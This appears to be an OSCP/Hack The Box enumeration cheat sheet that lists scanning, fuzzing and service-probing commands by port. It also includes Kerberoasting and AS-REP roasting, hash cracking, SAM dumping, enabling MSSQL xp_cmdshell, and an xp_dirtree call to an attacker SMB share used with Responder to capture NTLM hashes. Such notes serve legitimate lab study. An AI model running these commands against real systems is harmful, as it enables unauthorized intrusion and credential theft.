---
description: All but the easiest HTBs are harder than even the 25 point exam boxes.
---

# Enumeration (Commands & Links)

{% embed url="https://sgtdede.gitbook.io/hacking/oscp-2022/guide-en" %}

{% embed url="https://eins.li/posts/oscp-secret-sauce/" %}

{% embed url="https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html" %}

{% embed url="https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#reconnaissance" %}

{% embed url="https://github.com/oncybersec/oscp-enumeration-cheat-sheet" %}

### Nmap

```
nmap -sC -sV -p- $ip -v -oN scan.nmap        (TCP)
nmap -sU --top-ports 20 -oN scan.nmap -vv $ip  (UDP)
-Pn Disables host discovery and only conducts a port scan. 
-A OS/Version Detection
-O Remote OS detection using TCP/IP stack fingerprinting
```

### HTTP/HTTPS (80/443)

<pre><code>(VHost)     ffuf -w /usr/share/wordlists/bitquark-subdomains-top100000.txt -u http://$IP:PORT -h (try -H) 'Host: FUZZ.board.htb' -f(c/s/w)   
(Directory) ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP:PORT/FUZZ 
(File fuzzing) ffuf -u http://localhost:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt    
(HTTP GET)  ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx        
(HTTP POST) ffuf -w [wordlist]:FUZZ -u [URL] -X POST -d '<a data-footnote-ref href="#user-content-fn-1">id=FUZZ</a>' -H 'header: value' -fs xxx  
(Use raw request) : ffuf -request request.txt -request-proto http -w wordlist.txt -r [FUZZ should be present in the request]
(Multiple params) ffuf -w list1.txt:W1 -w list2.txt:W2 -X POST -d "username=W1&#x26;password=W2" -u [URL] -fc 200
-p "1.0" and -rate [25]  to rate limit incase of WAF
-r follow redirect
wfuzz -c -w /usr/share/wordlists/yes.txt -u "http://alert.htb/" -H "Host: FUZZ.alert.htb"

curl --insecure -b "[cookiename]=[value]" -X POST --data "[data]" [URL] (--insecure bypass SSL verification)

nikto -h $ip
</code></pre>

### FTP (21)

```
wget -r ftp://anonymous:@<IP>    [If you can't see anything or don't really know where you are]
ftp [ip]
passive (Mitigate entering passive mode)
dir
dir
binary (Set to binary mode for proper channel to download bin files)
get [file]
```

### SSH (22)

```
ssh -L [kali_port]:localhost:[target_port] [user]@[ip] -fN
chmod 600 id_dsa
port forwarding (local and remote)
sshuttle
proxychains?
```

### SMTP (25)

```
telnet 10.10.11.14 25
EHLO [emailid]
AUTH LOGIN
[username in base64]
[password in base64]

swaks --to receiver@mail.com --from sender@mail.com --auth LOGIN --auth-user sender@mail.com --header-X-Test "Header" --server <TARGET-IP> --attach file.txt
```

### Kerberos (88)

Golden/Silver ticket loading

```
./kerbrute_linux_amd64 userenum -d <domain>  userlist.txt --dc <domain> -v
./GetNPUsers.py -dc-ip [ip] -request '[domain]/[user]'
./GetNPUsers.py [domain] -dc-ip [ip] -usersfile userlist.txt
./GetNPUsers.py -no-pass -dc-ip [ip] [domain]/[user]
hashcat64 -m 18200 <hash> rockyou.txt -d 1

./GetUserSPNs.py [domain]/[user]:[password] -dc-ip [ip] 
./GetUserSPNs.py [domain]/[user]:[password] -dc-ip [ip] -request <get ticket here>

export KRB5CCNAME=/home/jtripz/htb/rooms/escape/ticket.ccache; faketime -f '+8h' /usr/bin/python3 psexec.py [domain]/[username]@[dc] -k -no-pass
```

### SMB (139/445)

```
NXC
nxc smb [ip]
nxc smb 10.10.11.35 -u userlist.txt -p 'password' [bruteforce usernames, change smb to winrm/ldap or any other protocol you want to test perms for]
nxc smb [host/ip] -u guest -p '' --shares [list shares depending on user access provided]
nxc smb [host] -u [user] -p [password] --sam

SMBCLIENT [INTERACT WITH SMB]
smbclient //[ip]/[share] -N -L [List share with null auth]
smbclient --user username //10.10.11.35/DEV
recurse ON
prompt OFF
mget *
smbclient.py '[domain]/[user]:[pass]@[ip/host] -k -no-pass [Kerberos auth]

SMBMAP
smbmap -H [ip] -u user -p 'password' -r SYSVOL --depth 10
smbmap -H [ip] --download PATH_TO_FILE

RPCCLIENT
rpcclient -U '' -N 10.10.11.35   
rpcclient -U 'user'  10.10.11.35
enumdomusers
enumdomgroups
querygroup [RID]
queryuser [RID]
enumprivs

MOUNT
#First create folder in kali linux 
mkdir /mnt/smb
#mount folder to kali
sudo mount -t cifs //[IP]/[SHARE] /mnt/smb

responder to receive NTLM authentication hashes from services like mysql
smbserver.py
```

#### User Enumeration

<pre><code><strong>lookupsid.py guest@[ip] -no-pass
</strong>lookupsid.py [domain]/[user]:'[pass]'@[ip/domain]
netexec smb [ip] -u guest -p '' --[rid-brute/users/groups/local-users]
</code></pre>

{% embed url="https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html" %}

{% embed url="https://www.hackingarticles.in/active-directory-enumeration-rpcclient/" %}

### LDAP (389)&#x20;

```
ldapsearch -H ldap://[ip] -x -s base namingcontexts  [-x simple auth, -s scope]
ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" > ldap.anon.out  
ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)'

Windows timestamp to human cus Windows does not follow EPOC, for user and password creation and last pass attempt and all the stuff associated with the above search
ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName  
ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName  sAMAccountType

ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName sAMAccountType | grep sAMAccountName | awk '{print $2}' > userlist.ldap
```

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap" %}

### MSSQL (1433)

```
.\SQLCMD.EXE -S localhost -U [user] -P [password] -d [database] -Q "select table_name from streamio_backup.information_schema.tables;"

python3 mssqlclient.py [-port {opt}] [domain]/[user]:[password]@[dc] {-windows-auth}
enable_xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

sudo responder -I tun0
EXEC master.sys.xp_dirtree '\\10.10.14.9\myshare',1, 1
```

### SQL (3306)

Payload all the things for both please

```
mysql -h [IP] -u [username] -p
```

### PostgreSQL (5432)

```
psql -h localhost -p 5432 -U [user] -d [database]
\list
\c [dbname]
\dt
\d [table] (listing schema for table users)
select * from [table];
```

{% embed url="https://web.archive.org/web/20200309204648/http://0daysecurity.com/penetration-testing/enumeration.html" %}

[^1]: FUZZ=key if you wanna do the opposite
